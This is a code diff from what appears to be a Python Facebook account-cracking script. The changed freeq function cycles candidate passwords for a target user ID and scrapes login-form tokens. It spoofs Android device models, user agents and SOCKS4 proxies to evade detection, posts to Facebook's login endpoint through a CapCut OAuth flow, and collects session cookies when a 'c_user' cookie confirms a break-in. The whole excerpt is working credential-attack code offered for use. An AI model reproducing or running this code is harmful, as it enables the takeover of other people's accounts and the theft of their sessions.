@@ -634,44 +634,68 @@ def freeq(uid,pwx,tl):
     global cp
     global ugen
     try:
-        for ps in pwx:
-            bi = random.choice([A])
+        for ps in pss:
             session = requests.Session()
-            pro = random.choice(ugen)
-            free_fb = session.get('https://free.facebook.com').text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "next":"https://web.facebook.com/login/device-based/regular/login/?refsrc",
-            "flow":"login_no_pain",
-            "pass":ps,
-            "login":"Log In"}
-            header_freefb = {'authority': 'x.facebook.com',
-            'method': 'GET',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-model': '"TECNO KE5j"',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-            'viewport-width': '980',
+            sys.stdout.write(f'\r\033[1;37m[\033[1;32mCRACK\033[1;37m]\033[1;31m[\033[1;33m{loop}/{total}\033[1;30m] \033[1;90m[\033[1;32mOK\033[1;30m]\033[1;37m-\033[1;32m{len(ok)}\r')
+            sys.stdout.flush()
+            models = random.choice(['SM-J100F', 'SM-J100FN', 'SM-J100H', 'SM-J100H/DD', 'SM-J100H', 'SM-J100M', 'SM-J100MU', 'SM-J100ML', 'SM-J100VPP', 'SM-J100Y', 'SM-J111F', 'SM-J110G', 'SM-J110F', 'SM-J110H', 'SM-J110M', 'SM-J110L', 'SM-J111M', 'SM-M526BR', 'SM-M526BR/DS', 'SM-M526B', 'SM-M526B/DS', 'SM-A326B', 'SM-A326B/DS', 'SM-A326BR/DS', 'SM-A326BR', 'SM-A326U', 'SM-A326W', 'SM-A326U1', 'SM-A326K', 'SCG08', 'SM-S326DL', 'V2027', 'V2032', 'RMX2027', 'RMX2020', 'RMX2021', 'CPH1969', 'CPH2209', 'CPH1987'])
+            ua = random.choice(ugen)
+            rr = random.randint
+            rc = random.choice
+            nip=random.choice(prox)
+            proxs = {'http': 'socks4://'+nip}
+            session.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="114"',"sec-ch-ua-mobile": "?0","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+            link = session.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D3c7611813gAToVCgoVPZIDA2ZGVlNWU4YjUwZDhmNzcwOTM4NDQ5NTY4MzNjMTE3oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIGE2OWM5MWM2YjdiOGFmNWMyNDI4ZGRjODJlMGRkNTY0oVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D142ed561-e5c8-49a4-bec4-eaa45bae67f0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D3c7611813gAToVCgoVPZIDA2ZGVlNWU4YjUwZDhmNzcwOTM4NDQ5NTY4MzNjMTE3oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIGE2OWM5MWM2YjdiOGFmNWMyNDI4ZGRjODJlMGRkNTY0oVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
+            data = {
+            'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
+            'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
+            'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
+            'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
+            'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
+            'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
+            'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),
+            '_fb_noscript': 'true',
+            'email': uid,
+            'pass': ps,
+            'login': 'Masuk'
             }
-            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+            head = {
+            'Host': 'x.facebook.com',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dpr': f'{str(rr(1,5))}.{str(rr(1000,5000))}',
+            'origin': 'https://p.facebook.com',
+            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D3c7611813gAToVCgoVPZIDA2ZGVlNWU4YjUwZDhmNzcwOTM4NDQ5NTY4MzNjMTE3oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIGE2OWM5MWM2YjdiOGFmNWMyNDI4ZGRjODJlMGRkNTY0oVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D142ed561-e5c8-49a4-bec4-eaa45bae67f0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D3c7611813gAToVCgoVPZIDA2ZGVlNWU4YjUwZDhmNzcwOTM4NDQ5NTY4MzNjMTE3oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIGE2OWM5MWM2YjdiOGFmNWMyNDI4ZGRjODJlMGRkNTY0oVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Google Chrome";v="116"',
+            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5761.201", "Google Chrome";v="116.0.5761.201"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': f'"{models}"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': f'"{str(rr(6,13))}"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': ua,
+            'viewport-width': '421',
+            'x-asbd-id': '129477',
+            'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
+            'x-requested-with': 'XMLHttpRequest',
+            'x-response-format': 'JSONStream',
+            }
+            params = {
+            'api_key': '3213804762189845',
+            'auth_token': '86ee9081567a3ae59cfedd887a685aca',
+            'skip_api_login': '1',
+            'signed_next': '1',
+            'next': 'https://mbasic.facebook.com/v3.1/dialog/oauth?client_id=3213804762189845&redirect_uri=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success&scope=email&state=3c7611813gAToVCgoVPZIDA2ZGVlNWU4YjUwZDhmNzcwOTM4NDQ5NTY4MzNjMTE3oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIGE2OWM5MWM2YjdiOGFmNWMyNDI4ZGRjODJlMGRkNTY0oVcAoUYAolNBAKFVwqJNTMI%253D&ret=login&fbapp_pres=0&logger_id=142ed561-e5c8-49a4-bec4-eaa45bae67f0&tp=unspecified',
+            'refsrc': 'deprecated',
+            'app_id': '3213804762189845',
+            'cancel': 'https://www.capcut.com/passport/web/web_login_success?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=3c7611813gAToVCgoVPZIDA2ZGVlNWU4YjUwZDhmNzcwOTM4NDQ5NTY4MzNjMTE3oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIGE2OWM5MWM2YjdiOGFmNWMyNDI4ZGRjODJlMGRkNTY0oVcAoUYAolNBAKFVwqJNTMI%253D#_=_',
+            'lwv': '100',
+            }
+            lo = session.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',params=params,headers=head,data=data,allow_redirects=False)
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
